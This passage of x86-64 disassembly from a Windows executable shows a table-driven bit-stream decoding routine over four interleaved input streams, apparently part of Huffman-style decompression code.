   14000259b:	66 83 fb 07          	cmp    $0x7,%bx
   14000259f:	77 70                	ja     0x140002611
   1400025a1:	4c 8d 25 38 fb 01 00 	lea    0x1fb38(%rip),%r12        # 0x1400220e0
   1400025a8:	4b 63 34 9c          	movslq (%r12,%r11,4),%rsi
   1400025ac:	4c 01 e6             	add    %r12,%rsi
   1400025af:	ff e6                	jmp    *%rsi
   1400025b1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400025b6:	0f b6 76 06          	movzbl 0x6(%rsi),%esi
   1400025ba:	48 c1 e6 30          	shl    $0x30,%rsi
   1400025be:	48 01 f5             	add    %rsi,%rbp
   1400025c1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400025c6:	0f b6 76 05          	movzbl 0x5(%rsi),%esi
   1400025ca:	48 c1 e6 28          	shl    $0x28,%rsi
   1400025ce:	48 01 f5             	add    %rsi,%rbp
   1400025d1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400025d6:	0f b6 76 04          	movzbl 0x4(%rsi),%esi
   1400025da:	48 c1 e6 20          	shl    $0x20,%rsi
   1400025de:	48 01 f5             	add    %rsi,%rbp
   1400025e1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400025e6:	0f b6 76 03          	movzbl 0x3(%rsi),%esi
   1400025ea:	48 c1 e6 18          	shl    $0x18,%rsi
   1400025ee:	48 01 f5             	add    %rsi,%rbp
   1400025f1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400025f6:	0f b6 76 02          	movzbl 0x2(%rsi),%esi
   1400025fa:	48 c1 e6 10          	shl    $0x10,%rsi
   1400025fe:	48 01 f5             	add    %rsi,%rbp
   140002601:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002606:	0f b6 76 01          	movzbl 0x1(%rsi),%esi
   14000260a:	48 c1 e6 08          	shl    $0x8,%rsi
   14000260e:	48 01 f5             	add    %rsi,%rbp
   140002611:	45 84 c9             	test   %r9b,%r9b
   140002614:	0f 84 ce f8 ff ff    	je     0x140001ee8
   14000261a:	be 09 00 00 00       	mov    $0x9,%esi
   14000261f:	45 0f bd c9          	bsr    %r9d,%r9d
   140002623:	29 de                	sub    %ebx,%esi
   140002625:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000262a:	c1 e6 03             	shl    $0x3,%esi
   14000262d:	44 29 ce             	sub    %r9d,%esi
   140002630:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002635:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140002639:	e9 ac f9 ff ff       	jmp    0x140001fea
   14000263e:	66 90                	xchg   %ax,%ax
   140002640:	48 39 44 24 78       	cmp    %rax,0x78(%rsp)
   140002645:	48 8b 2c 24          	mov    (%rsp),%rbp
   140002649:	89 7c 24 70          	mov    %edi,0x70(%rsp)
   14000264d:	4d 89 f4             	mov    %r14,%r12
   140002650:	41 0f 92 c0          	setb   %r8b
   140002654:	48 39 9c 24 88 00 00 	cmp    %rbx,0x88(%rsp)
   14000265b:	00 
   14000265c:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140002661:	0f 92 c1             	setb   %cl
   140002664:	44 08 c1             	or     %r8b,%cl
   140002667:	0f 85 7b f8 ff ff    	jne    0x140001ee8
   14000266d:	48 39 b4 24 90 00 00 	cmp    %rsi,0x90(%rsp)
   140002674:	00 
   140002675:	0f 82 6d f8 ff ff    	jb     0x140001ee8
   14000267b:	41 83 fd 40          	cmp    $0x40,%r13d
   14000267f:	0f 87 44 01 00 00    	ja     0x1400027c9
   140002685:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000268a:	44 89 0c 24          	mov    %r9d,(%rsp)
   14000268e:	4c 8b 4c 24 08       	mov    0x8(%rsp),%r9
   140002693:	48 83 e9 03          	sub    $0x3,%rcx
   140002697:	48 89 4c 24 18       	mov    %rcx,0x18(%rsp)
   14000269c:	8b 4c 24 74          	mov    0x74(%rsp),%ecx
   1400026a0:	f7 d9                	neg    %ecx
   1400026a2:	83 e1 3f             	and    $0x3f,%ecx
   1400026a5:	41 89 ce             	mov    %ecx,%r14d
   1400026a8:	e9 e2 00 00 00       	jmp    0x14000278f
   1400026ad:	0f 1f 00             	nopl   (%rax)
   1400026b0:	4c 39 4c 24 20       	cmp    %r9,0x20(%rsp)
   1400026b5:	0f 84 05 01 00 00    	je     0x1400027c0
   1400026bb:	45 89 ea             	mov    %r13d,%r10d
   1400026be:	4c 89 c9             	mov    %r9,%rcx
   1400026c1:	41 c1 ea 03          	shr    $0x3,%r10d
   1400026c5:	45 89 d0             	mov    %r10d,%r8d
   1400026c8:	4c 29 c1             	sub    %r8,%rcx
   1400026cb:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   1400026d0:	4c 39 c1             	cmp    %r8,%rcx
   1400026d3:	0f 82 07 07 00 00    	jb     0x140002de0
   1400026d9:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   1400026de:	49 89 c9             	mov    %rcx,%r9
   1400026e1:	4c 39 c0             	cmp    %r8,%rax
   1400026e4:	41 0f 92 c0          	setb   %r8b
   1400026e8:	41 c1 e2 03          	shl    $0x3,%r10d
   1400026ec:	45 29 d5             	sub    %r10d,%r13d
   1400026ef:	4c 8b 11             	mov    (%rcx),%r10
   1400026f2:	45 84 c0             	test   %r8b,%r8b
   1400026f5:	0f 84 c5 00 00 00    	je     0x1400027c0
   1400026fb:	44 89 e9             	mov    %r13d,%ecx
   1400026fe:	4d 89 d0             	mov    %r10,%r8
   140002701:	48 83 c0 04          	add    $0x4,%rax
   140002705:	49 d3 e0             	shl    %cl,%r8
   140002708:	44 89 f1             	mov    %r14d,%ecx
   14000270b:	49 d3 e8             	shr    %cl,%r8
   14000270e:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   140002712:	41 0f b6 08          	movzbl (%r8),%ecx
   140002716:	45 0f b6 40 01       	movzbl 0x1(%r8),%r8d
   14000271b:	45 01 e8             	add    %r13d,%r8d
   14000271e:	88 48 fc             	mov    %cl,-0x4(%rax)
   140002721:	4d 89 d5             	mov    %r10,%r13
   140002724:	44 89 c1             	mov    %r8d,%ecx
   140002727:	49 d3 e5             	shl    %cl,%r13
   14000272a:	44 89 f1             	mov    %r14d,%ecx
   14000272d:	49 d3 ed             	shr    %cl,%r13
   140002730:	4e 8d 2c 6a          	lea    (%rdx,%r13,2),%r13
   140002734:	41 0f b6 4d 00       	movzbl 0x0(%r13),%ecx
   140002739:	45 0f b6 6d 01       	movzbl 0x1(%r13),%r13d
   14000273e:	45 01 c5             	add    %r8d,%r13d
   140002741:	88 48 fd             	mov    %cl,-0x3(%rax)
   140002744:	4d 89 d0             	mov    %r10,%r8
   140002747:	44 89 e9             	mov    %r13d,%ecx
   14000274a:	49 d3 e0             	shl    %cl,%r8
   14000274d:	44 89 f1             	mov    %r14d,%ecx
   140002750:	49 d3 e8             	shr    %cl,%r8
   140002753:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   140002757:	41 0f b6 08          	movzbl (%r8),%ecx
   14000275b:	45 0f b6 40 01       	movzbl 0x1(%r8),%r8d
   140002760:	45 01 e8             	add    %r13d,%r8d
   140002763:	88 48 fe             	mov    %cl,-0x2(%rax)
   140002766:	4d 89 d5             	mov    %r10,%r13
   140002769:	44 89 c1             	mov    %r8d,%ecx
   14000276c:	49 d3 e5             	shl    %cl,%r13
   14000276f:	44 89 f1             	mov    %r14d,%ecx
   140002772:	49 d3 ed             	shr    %cl,%r13
   140002775:	4e 8d 2c 6a          	lea    (%rdx,%r13,2),%r13
   140002779:	41 0f b6 4d 00       	movzbl 0x0(%r13),%ecx
   14000277e:	45 0f b6 6d 01       	movzbl 0x1(%r13),%r13d
   140002783:	45 01 c5             	add    %r8d,%r13d
   140002786:	88 48 ff             	mov    %cl,-0x1(%rax)
   140002789:	41 83 fd 40          	cmp    $0x40,%r13d
   14000278d:	77 31                	ja     0x1400027c0
   14000278f:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002794:	49 39 c9             	cmp    %rcx,%r9
   140002797:	0f 82 13 ff ff ff    	jb     0x1400026b0
   14000279d:	44 89 e9             	mov    %r13d,%ecx
   1400027a0:	41 83 e5 07          	and    $0x7,%r13d
   1400027a4:	c1 e9 03             	shr    $0x3,%ecx
   1400027a7:	49 29 c9             	sub    %rcx,%r9
   1400027aa:	48 8b 4c 24 18       	mov    0x18(%rsp),%rcx
   1400027af:	4d 8b 11             	mov    (%r9),%r10
   1400027b2:	48 39 c8             	cmp    %rcx,%rax
   1400027b5:	41 0f 92 c0          	setb   %r8b
   1400027b9:	e9 34 ff ff ff       	jmp    0x1400026f2
   1400027be:	66 90                	xchg   %ax,%ax
   1400027c0:	4c 89 4c 24 08       	mov    %r9,0x8(%rsp)
   1400027c5:	44 8b 0c 24          	mov    (%rsp),%r9d
   1400027c9:	8b 4c 24 74          	mov    0x74(%rsp),%ecx
   1400027cd:	f7 d9                	neg    %ecx
   1400027cf:	83 e1 3f             	and    $0x3f,%ecx
   1400027d2:	41 89 ce             	mov    %ecx,%r14d
   1400027d5:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400027da:	48 39 c8             	cmp    %rcx,%rax
   1400027dd:	73 2d                	jae    0x14000280c
   1400027df:	44 89 e9             	mov    %r13d,%ecx
   1400027e2:	4d 89 d0             	mov    %r10,%r8
   1400027e5:	48 83 c0 01          	add    $0x1,%rax
   1400027e9:	49 d3 e0             	shl    %cl,%r8
   1400027ec:	44 89 f1             	mov    %r14d,%ecx
   1400027ef:	49 d3 e8             	shr    %cl,%r8
   1400027f2:	4a 8d 0c 42          	lea    (%rdx,%r8,2),%rcx
   1400027f6:	44 0f b6 01          	movzbl (%rcx),%r8d
   1400027fa:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   1400027fe:	44 88 40 ff          	mov    %r8b,-0x1(%rax)
   140002802:	41 01 cd             	add    %ecx,%r13d
   140002805:	48 39 44 24 78       	cmp    %rax,0x78(%rsp)
   14000280a:	75 d3                	jne    0x1400027df
   14000280c:	41 83 ff 40          	cmp    $0x40,%r15d
   140002810:	0f 87 37 01 00 00    	ja     0x14000294d
   140002816:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000281d:	00 
   14000281e:	44 8b 44 24 74       	mov    0x74(%rsp),%r8d
   140002823:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   140002828:	4c 8d 70 fd          	lea    -0x3(%rax),%r14
   14000282c:	41 f7 d8             	neg    %r8d
   14000282f:	4c 89 34 24          	mov    %r14,(%rsp)
   140002833:	41 83 e0 3f          	and    $0x3f,%r8d
   140002837:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   14000283c:	e9 d8 00 00 00       	jmp    0x140002919
   140002841:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002848:	4c 39 54 24 10       	cmp    %r10,0x10(%rsp)
   14000284d:	0f 84 f5 00 00 00    	je     0x140002948
   140002853:	44 89 ff             	mov    %r15d,%edi
   140002856:	4c 89 d0             	mov    %r10,%rax
   140002859:	c1 ef 03             	shr    $0x3,%edi
   14000285c:	89 f9                	mov    %edi,%ecx
   14000285e:	48 29 c8             	sub    %rcx,%rax
   140002861:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140002866:	48 39 c8             	cmp    %rcx,%rax
   140002869:	0f 82 a1 05 00 00    	jb     0x140002e10
   14000286f:	48 8b 0c 24          	mov    (%rsp),%rcx
   140002873:	49 89 c2             	mov    %rax,%r10
   140002876:	48 39 cb             	cmp    %rcx,%rbx
   140002879:	0f 92 c1             	setb   %cl
   14000287c:	c1 e7 03             	shl    $0x3,%edi
   14000287f:	41 29 ff             	sub    %edi,%r15d
   140002882:	48 8b 38             	mov    (%rax),%rdi
   140002885:	84 c9                	test   %cl,%cl
   140002887:	0f 84 bb 00 00 00    	je     0x140002948
   14000288d:	44 89 f9             	mov    %r15d,%ecx
   140002890:	48 89 f8             	mov    %rdi,%rax
   140002893:	48 83 c3 04          	add    $0x4,%rbx
   140002897:	48 d3 e0             	shl    %cl,%rax
   14000289a:	44 89 c1             	mov    %r8d,%ecx
   14000289d:	48 d3 e8             	shr    %cl,%rax
   1400028a0:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   1400028a4:	0f b6 08             	movzbl (%rax),%ecx
   1400028a7:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   1400028ab:	44 01 f8             	add    %r15d,%eax
   1400028ae:	88 4b fc             	mov    %cl,-0x4(%rbx)
   1400028b1:	49 89 ff             	mov    %rdi,%r15
   1400028b4:	89 c1                	mov    %eax,%ecx
   1400028b6:	49 d3 e7             	shl    %cl,%r15
   1400028b9:	44 89 c1             	mov    %r8d,%ecx
   1400028bc:	49 d3 ef             	shr    %cl,%r15
   1400028bf:	4e 8d 3c 7a          	lea    (%rdx,%r15,2),%r15
   1400028c3:	41 0f b6 0f          	movzbl (%r15),%ecx
   1400028c7:	45 0f b6 7f 01       	movzbl 0x1(%r15),%r15d
   1400028cc:	41 01 c7             	add    %eax,%r15d
   1400028cf:	88 4b fd             	mov    %cl,-0x3(%rbx)
   1400028d2:	48 89 f8             	mov    %rdi,%rax
   1400028d5:	44 89 f9             	mov    %r15d,%ecx
   1400028d8:	48 d3 e0             	shl    %cl,%rax
   1400028db:	44 89 c1             	mov    %r8d,%ecx
   1400028de:	48 d3 e8             	shr    %cl,%rax
   1400028e1:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   1400028e5:	0f b6 08             	movzbl (%rax),%ecx
   1400028e8:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   1400028ec:	44 01 f8             	add    %r15d,%eax
   1400028ef:	88 4b fe             	mov    %cl,-0x2(%rbx)
   1400028f2:	49 89 ff             	mov    %rdi,%r15
   1400028f5:	89 c1                	mov    %eax,%ecx
   1400028f7:	49 d3 e7             	shl    %cl,%r15
   1400028fa:	44 89 c1             	mov    %r8d,%ecx
   1400028fd:	49 d3 ef             	shr    %cl,%r15
   140002900:	4e 8d 3c 7a          	lea    (%rdx,%r15,2),%r15
   140002904:	41 0f b6 0f          	movzbl (%r15),%ecx
   140002908:	45 0f b6 7f 01       	movzbl 0x1(%r15),%r15d
   14000290d:	41 01 c7             	add    %eax,%r15d
   140002910:	88 4b ff             	mov    %cl,-0x1(%rbx)
   140002913:	41 83 ff 40          	cmp    $0x40,%r15d
   140002917:	77 2f                	ja     0x140002948
   140002919:	4d 39 f2             	cmp    %r14,%r10
   14000291c:	0f 82 26 ff ff ff    	jb     0x140002848
   140002922:	44 89 f8             	mov    %r15d,%eax
   140002925:	41 83 e7 07          	and    $0x7,%r15d
   140002929:	c1 e8 03             	shr    $0x3,%eax
   14000292c:	49 29 c2             	sub    %rax,%r10
   14000292f:	48 8b 04 24          	mov    (%rsp),%rax
   140002933:	49 8b 3a             	mov    (%r10),%rdi
   140002936:	48 39 c3             	cmp    %rax,%rbx
   140002939:	0f 92 c1             	setb   %cl
   14000293c:	e9 44 ff ff ff       	jmp    0x140002885
   140002941:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002948:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   14000294d:	44 8b 44 24 74       	mov    0x74(%rsp),%r8d
   140002952:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002959:	00 
   14000295a:	41 f7 d8             	neg    %r8d
   14000295d:	49 89 c2             	mov    %rax,%r10
   140002960:	41 83 e0 3f          	and    $0x3f,%r8d
   140002964:	48 39 c3             	cmp    %rax,%rbx
   140002967:	73 29                	jae    0x140002992
   140002969:	44 89 f9             	mov    %r15d,%ecx
   14000296c:	48 89 f8             	mov    %rdi,%rax
   14000296f:	48 83 c3 01          	add    $0x1,%rbx
   140002973:	48 d3 e0             	shl    %cl,%rax
   140002976:	44 89 c1             	mov    %r8d,%ecx
   140002979:	48 d3 e8             	shr    %cl,%rax
   14000297c:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140002980:	0f b6 08             	movzbl (%rax),%ecx
   140002983:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140002987:	88 4b ff             	mov    %cl,-0x1(%rbx)
   14000298a:	41 01 c7             	add    %eax,%r15d
   14000298d:	49 39 da             	cmp    %rbx,%r10
   140002990:	75 d7                	jne    0x140002969
   140002992:	8b 44 24 70          	mov    0x70(%rsp),%eax
   140002996:	83 f8 40             	cmp    $0x40,%eax
   140002999:	0f 87 2a 01 00 00    	ja     0x140002ac9
   14000299f:	44 8b 44 24 74       	mov    0x74(%rsp),%r8d
   1400029a4:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400029ab:	00 
   1400029ac:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400029b1:	4c 8b 74 24 60       	mov    0x60(%rsp),%r14
   1400029b6:	41 f7 d8             	neg    %r8d
   1400029b9:	48 83 eb 03          	sub    $0x3,%rbx
   1400029bd:	41 83 e0 3f          	and    $0x3f,%r8d
   1400029c1:	e9 d7 00 00 00       	jmp    0x140002a9d
   1400029c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400029cd:	00 00 00 
   1400029d0:	48 39 7c 24 40       	cmp    %rdi,0x40(%rsp)
   1400029d5:	0f 84 e5 00 00 00    	je     0x140002ac0
   1400029db:	89 c5                	mov    %eax,%ebp
   1400029dd:	48 89 f9             	mov    %rdi,%rcx
   1400029e0:	c1 ed 03             	shr    $0x3,%ebp
   1400029e3:	41 89 ea             	mov    %ebp,%r10d
   1400029e6:	4c 29 d1             	sub    %r10,%rcx
   1400029e9:	4c 8b 54 24 40       	mov    0x40(%rsp),%r10
   1400029ee:	4c 39 d1             	cmp    %r10,%rcx
   1400029f1:	0f 82 41 04 00 00    	jb     0x140002e38
   1400029f7:	48 39 de             	cmp    %rbx,%rsi
   1400029fa:	48 89 cf             	mov    %rcx,%rdi
   1400029fd:	41 0f 92 c2          	setb   %r10b
   140002a01:	c1 e5 03             	shl    $0x3,%ebp
   140002a04:	29 e8                	sub    %ebp,%eax
   140002a06:	48 8b 29             	mov    (%rcx),%rbp
   140002a09:	45 84 d2             	test   %r10b,%r10b
   140002a0c:	0f 84 ae 00 00 00    	je     0x140002ac0
   140002a12:	89 c1                	mov    %eax,%ecx
   140002a14:	49 89 ea             	mov    %rbp,%r10
   140002a17:	48 83 c6 04          	add    $0x4,%rsi
   140002a1b:	49 d3 e2             	shl    %cl,%r10
   140002a1e:	44 89 c1             	mov    %r8d,%ecx
   140002a21:	49 d3 ea             	shr    %cl,%r10
   140002a24:	4e 8d 14 52          	lea    (%rdx,%r10,2),%r10
   140002a28:	41 0f b6 0a          	movzbl (%r10),%ecx
   140002a2c:	45 0f b6 52 01       	movzbl 0x1(%r10),%r10d
   140002a31:	41 01 c2             	add    %eax,%r10d
   140002a34:	88 4e fc             	mov    %cl,-0x4(%rsi)
   140002a37:	48 89 e8             	mov    %rbp,%rax
   140002a3a:	44 89 d1             	mov    %r10d,%ecx
   140002a3d:	48 d3 e0             	shl    %cl,%rax
   140002a40:	44 89 c1             	mov    %r8d,%ecx
   140002a43:	48 d3 e8             	shr    %cl,%rax
   140002a46:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140002a4a:	0f b6 08             	movzbl (%rax),%ecx
   140002a4d:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140002a51:	44 01 d0             	add    %r10d,%eax
   140002a54:	88 4e fd             	mov    %cl,-0x3(%rsi)
   140002a57:	49 89 ea             	mov    %rbp,%r10
   140002a5a:	89 c1                	mov    %eax,%ecx
   140002a5c:	49 d3 e2             	shl    %cl,%r10
   140002a5f:	44 89 c1             	mov    %r8d,%ecx
   140002a62:	49 d3 ea             	shr    %cl,%r10
   140002a65:	4e 8d 14 52          	lea    (%rdx,%r10,2),%r10
   140002a69:	41 0f b6 0a          	movzbl (%r10),%ecx
   140002a6d:	45 0f b6 52 01       	movzbl 0x1(%r10),%r10d
   140002a72:	41 01 c2             	add    %eax,%r10d
   140002a75:	88 4e fe             	mov    %cl,-0x2(%rsi)
   140002a78:	48 89 e8             	mov    %rbp,%rax
   140002a7b:	44 89 d1             	mov    %r10d,%ecx
   140002a7e:	48 d3 e0             	shl    %cl,%rax
   140002a81:	44 89 c1             	mov    %r8d,%ecx
   140002a84:	48 d3 e8             	shr    %cl,%rax
   140002a87:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140002a8b:	0f b6 08             	movzbl (%rax),%ecx
   140002a8e:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140002a92:	44 01 d0             	add    %r10d,%eax
   140002a95:	88 4e ff             	mov    %cl,-0x1(%rsi)
   140002a98:	83 f8 40             	cmp    $0x40,%eax
   140002a9b:	77 23                	ja     0x140002ac0
   140002a9d:	4c 39 f7             	cmp    %r14,%rdi
   140002aa0:	0f 82 2a ff ff ff    	jb     0x1400029d0
   140002aa6:	89 c1                	mov    %eax,%ecx
   140002aa8:	83 e0 07             	and    $0x7,%eax
   140002aab:	c1 e9 03             	shr    $0x3,%ecx
   140002aae:	48 29 cf             	sub    %rcx,%rdi
   140002ab1:	48 39 de             	cmp    %rbx,%rsi
   140002ab4:	48 8b 2f             	mov    (%rdi),%rbp
   140002ab7:	41 0f 92 c2          	setb   %r10b
   140002abb:	e9 49 ff ff ff       	jmp    0x140002a09
   140002ac0:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140002ac5:	89 44 24 70          	mov    %eax,0x70(%rsp)
   140002ac9:	44 8b 44 24 74       	mov    0x74(%rsp),%r8d
   140002ace:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   140002ad5:	00 
   140002ad6:	41 f7 d8             	neg    %r8d
   140002ad9:	41 83 e0 3f          	and    $0x3f,%r8d
   140002add:	48 39 c6             	cmp    %rax,%rsi
   140002ae0:	73 36                	jae    0x140002b18
   140002ae2:	44 8b 54 24 70       	mov    0x70(%rsp),%r10d
   140002ae7:	48 89 c3             	mov    %rax,%rbx
   140002aea:	44 89 d1             	mov    %r10d,%ecx
   140002aed:	48 89 e8             	mov    %rbp,%rax
   140002af0:	48 83 c6 01          	add    $0x1,%rsi
   140002af4:	48 d3 e0             	shl    %cl,%rax
   140002af7:	44 89 c1             	mov    %r8d,%ecx
   140002afa:	48 d3 e8             	shr    %cl,%rax
   140002afd:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140002b01:	0f b6 08             	movzbl (%rax),%ecx
   140002b04:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140002b08:	88 4e ff             	mov    %cl,-0x1(%rsi)
   140002b0b:	41 01 c2             	add    %eax,%r10d
   140002b0e:	48 39 f3             	cmp    %rsi,%rbx
   140002b11:	75 d7                	jne    0x140002aea
   140002b13:	44 89 54 24 70       	mov    %r10d,0x70(%rsp)
   140002b18:	41 83 f9 40          	cmp    $0x40,%r9d
   140002b1c:	0f 87 23 01 00 00    	ja     0x140002c45
   140002b22:	44 8b 44 24 74       	mov    0x74(%rsp),%r8d
   140002b27:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140002b2c:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002b33:	00 
   140002b34:	4c 8b 54 24 38       	mov    0x38(%rsp),%r10
   140002b39:	41 f7 d8             	neg    %r8d
   140002b3c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140002b41:	41 83 e0 3f          	and    $0x3f,%r8d
   140002b45:	e9 d0 00 00 00       	jmp    0x140002c1a
   140002b4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002b50:	4c 39 d3             	cmp    %r10,%rbx
   140002b53:	0f 84 e7 00 00 00    	je     0x140002c40
   140002b59:	44 89 c8             	mov    %r9d,%eax
   140002b5c:	4c 89 d1             	mov    %r10,%rcx
   140002b5f:	c1 e8 03             	shr    $0x3,%eax
   140002b62:	89 c5                	mov    %eax,%ebp
   140002b64:	48 29 e9             	sub    %rbp,%rcx
   140002b67:	48 39 d9             	cmp    %rbx,%rcx
   140002b6a:	0f 82 f0 02 00 00    	jb     0x140002e60
   140002b70:	49 39 fb             	cmp    %rdi,%r11
   140002b73:	4c 8b 21             	mov    (%rcx),%r12
   140002b76:	49 89 ca             	mov    %rcx,%r10
   140002b79:	40 0f 92 c5          	setb   %bpl
   140002b7d:	c1 e0 03             	shl    $0x3,%eax
   140002b80:	41 29 c1             	sub    %eax,%r9d
   140002b83:	40 84 ed             	test   %bpl,%bpl
   140002b86:	0f 84 b4 00 00 00    	je     0x140002c40
   140002b8c:	44 89 c9             	mov    %r9d,%ecx
   140002b8f:	4c 89 e0             	mov    %r12,%rax
   140002b92:	49 83 c3 04          	add    $0x4,%r11
   140002b96:	48 d3 e0             	shl    %cl,%rax
   140002b99:	44 89 c1             	mov    %r8d,%ecx
   140002b9c:	48 d3 e8             	shr    %cl,%rax
   140002b9f:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140002ba3:	0f b6 08             	movzbl (%rax),%ecx
   140002ba6:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140002baa:	44 01 c8             	add    %r9d,%eax
   140002bad:	41 88 4b fc          	mov    %cl,-0x4(%r11)
   140002bb1:	4d 89 e1             	mov    %r12,%r9
   140002bb4:	89 c1                	mov    %eax,%ecx
   140002bb6:	49 d3 e1             	shl    %cl,%r9
   140002bb9:	44 89 c1             	mov    %r8d,%ecx
   140002bbc:	49 d3 e9             	shr    %cl,%r9
   140002bbf:	4a 8d 0c 4a          	lea    (%rdx,%r9,2),%rcx
   140002bc3:	44 0f b6 49 01       	movzbl 0x1(%rcx),%r9d
   140002bc8:	0f b6 29             	movzbl (%rcx),%ebp
   140002bcb:	41 01 c1             	add    %eax,%r9d
   140002bce:	4c 89 e0             	mov    %r12,%rax
   140002bd1:	41 88 6b fd          	mov    %bpl,-0x3(%r11)
   140002bd5:	44 89 c9             	mov    %r9d,%ecx
   140002bd8:	48 d3 e0             	shl    %cl,%rax
   140002bdb:	44 89 c1             	mov    %r8d,%ecx
   140002bde:	48 d3 e8             	shr    %cl,%rax
   140002be1:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140002be5:	0f b6 08             	movzbl (%rax),%ecx
   140002be8:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140002bec:	44 01 c8             	add    %r9d,%eax
   140002bef:	41 88 4b fe          	mov    %cl,-0x2(%r11)
   140002bf3:	4d 89 e1             	mov    %r12,%r9
   140002bf6:	89 c1                	mov    %eax,%ecx
   140002bf8:	49 d3 e1             	shl    %cl,%r9
   140002bfb:	44 89 c1             	mov    %r8d,%ecx
   140002bfe:	49 d3 e9             	shr    %cl,%r9
   140002c01:	4a 8d 0c 4a          	lea    (%rdx,%r9,2),%rcx
   140002c05:	44 0f b6 49 01       	movzbl 0x1(%rcx),%r9d
   140002c0a:	0f b6 29             	movzbl (%rcx),%ebp
   140002c0d:	41 01 c1             	add    %eax,%r9d
   140002c10:	41 88 6b ff          	mov    %bpl,-0x1(%r11)
   140002c14:	41 83 f9 40          	cmp    $0x40,%r9d
   140002c18:	77 26                	ja     0x140002c40
   140002c1a:	49 39 f2             	cmp    %rsi,%r10
   140002c1d:	0f 82 2d ff ff ff    	jb     0x140002b50
   140002c23:	44 89 c8             	mov    %r9d,%eax
   140002c26:	41 83 e1 07          	and    $0x7,%r9d
   140002c2a:	c1 e8 03             	shr    $0x3,%eax
   140002c2d:	49 29 c2             	sub    %rax,%r10
   140002c30:	49 39 fb             	cmp    %rdi,%r11
   140002c33:	4d 8b 22             	mov    (%r10),%r12
   140002c36:	40 0f 92 c5          	setb   %bpl
   140002c3a:	e9 44 ff ff ff       	jmp    0x140002b83
   140002c3f:	90                   	nop
   140002c40:	4c 89 54 24 38       	mov    %r10,0x38(%rsp)
   140002c45:	44 8b 44 24 74       	mov    0x74(%rsp),%r8d
   140002c4a:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   140002c51:	00 
   140002c52:	41 f7 d8             	neg    %r8d
   140002c55:	49 89 c2             	mov    %rax,%r10
   140002c58:	41 83 e0 3f          	and    $0x3f,%r8d
   140002c5c:	49 39 c3             	cmp    %rax,%r11
   140002c5f:	73 2a                	jae    0x140002c8b
   140002c61:	44 89 c9             	mov    %r9d,%ecx
   140002c64:	4c 89 e0             	mov    %r12,%rax
   140002c67:	49 83 c3 01          	add    $0x1,%r11
   140002c6b:	48 d3 e0             	shl    %cl,%rax
   140002c6e:	44 89 c1             	mov    %r8d,%ecx
   140002c71:	48 d3 e8             	shr    %cl,%rax
   140002c74:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140002c78:	0f b6 08             	movzbl (%rax),%ecx
   140002c7b:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140002c7f:	41 88 4b ff          	mov    %cl,-0x1(%r11)
   140002c83:	41 01 c1             	add    %eax,%r9d
   140002c86:	4d 39 da             	cmp    %r11,%r10
   140002c89:	75 d6                	jne    0x140002c61
   140002c8b:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140002c90:	31 d2                	xor    %edx,%edx
   140002c92:	48 39 5c 24 20       	cmp    %rbx,0x20(%rsp)
   140002c97:	0f 84 30 02 00 00    	je     0x140002ecd
   140002c9d:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140002ca2:	31 c0                	xor    %eax,%eax
   140002ca4:	48 39 74 24 10       	cmp    %rsi,0x10(%rsp)
   140002ca9:	0f 84 10 02 00 00    	je     0x140002ebf
   140002caf:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
